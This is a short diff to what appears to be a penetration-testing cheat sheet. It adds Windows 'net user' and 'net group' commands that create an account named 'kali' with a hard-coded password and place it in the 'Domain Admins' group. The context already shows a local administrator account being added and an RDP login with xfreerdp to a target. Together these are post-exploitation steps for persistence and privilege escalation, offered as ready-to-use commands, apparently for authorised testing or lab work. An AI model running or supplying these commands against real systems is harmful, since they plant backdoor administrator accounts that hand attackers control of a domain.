@@ -53,6 +53,13 @@ net user kali P4ssw0rd1 /add
 net localgroup Administrators kali /add
 ```
 
+### Create user and add to "Domain Admins" groups on a domain
+
+```cmd
+net user kali P4ssw0rd1 /add /domain
+net group "Domain Admins" kali /add /domain
+```
+
 ```bash
 xfreerdp /v:<Target IP> /u:kali /p:'P4ssw0rd1'
 ```
